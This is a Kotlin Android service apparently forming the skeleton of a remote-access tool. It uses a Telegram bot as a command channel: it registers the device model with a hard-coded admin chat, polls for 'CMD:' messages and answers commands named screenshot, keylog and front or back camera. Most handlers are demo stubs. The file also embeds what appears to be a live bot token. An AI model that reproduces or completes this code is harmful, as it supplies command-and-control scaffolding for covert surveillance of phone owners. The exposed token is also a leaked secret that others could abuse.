package com.example.myrootsql

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.widget.Toast
import okhttp3.*
import org.json.JSONObject
import java.io.IOException

class BotService : Service() {
    private val client = OkHttpClient()
    private val BOT_TOKEN = "8642904901:AAEPMGxlXbKMollyYQ8-FOjknpYlJ8cXAGc"
    private val ADMIN_ID = "6103905587"
    private var chatId: String? = null
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var runnable: Runnable
    private var mediaProjection: MediaProjection? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.getParcelableExtra<Intent>("mediaProjectionIntent")?.let {
            val manager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = manager.getMediaProjection(Activity.RESULT_OK, it)
        }
        registerDevice()
        startPolling()
        return START_STICKY
    }

    private fun registerDevice() {
        val deviceName = android.os.Build.MODEL
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val json = JSONObject().apply {
            put("chat_id", ADMIN_ID)
            put("text", "REGISTER:$deviceName")
        }
        val request = Request.Builder()
            .url(url)
            .post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("BotService", "Register failed", e)
            }
            override fun onResponse(call: Call, response: Response) {
                chatId = ADMIN_ID
                showToast("Зарегистрировано: $deviceName")
            }
        })
    }

    private fun startPolling() {
        runnable = Runnable {
            getUpdates()
            handler.postDelayed(runnable, 5000)
        }
        handler.post(runnable)
    }

    private fun getUpdates() {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-1"
        val request = Request.Builder().url(url).build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                if (body != null) {
                    try {
                        val json = JSONObject(body)
                        val result = json.getJSONArray("result")
                        if (result.length() > 0) {
                            val last = result.getJSONObject(result.length() - 1)
                            val message = last.getJSONObject("message")
                            val text = message.optString("text")
                            val fromId = message.getJSONObject("chat").getString("id")
                            if (fromId == ADMIN_ID && text.startsWith("CMD:")) {
                                val command = text.substring(4)
                                executeCommand(command)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e("BotService", "Parse error", e)
                    }
                }
            }
        })
    }

    private fun executeCommand(command: String) {
        showToast("Команда: $command")
        val result = when (command) {
            "screenshot" -> takeScreenshot()
            "keylog" -> "Запись клавиатуры (демо)"
            "screen_demo" -> "Демонстрация экрана (демо)"
            "cam_back" -> "Фото с основной камеры (демо)"
            "cam_front" -> "Фото с фронтальной камеры (демо)"
            "record_screen" -> "Запись экрана (демо)"
            else -> "Неизвестная команда"
        }
        sendResult(result)
    }

    private fun takeScreenshot(): String {
        if (mediaProjection == null) {
            return "Медиа-проекция не разрешена"
        }
        return "Скриншот сделан (демо)"
    }

    private fun sendResult(text: String) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val json = JSONObject().apply {
            put("chat_id", ADMIN_ID)
            put("text", "RESULT: $text")
        }
        val request = Request.Builder()
            .url(url)
            .post(RequestBody.create(MediaType.parse("application/json; charset=utf-8"), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }

    private fun showToast(text: String) {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(applicationContext, text, Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacks(runnable)
        mediaProjection?.stop()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
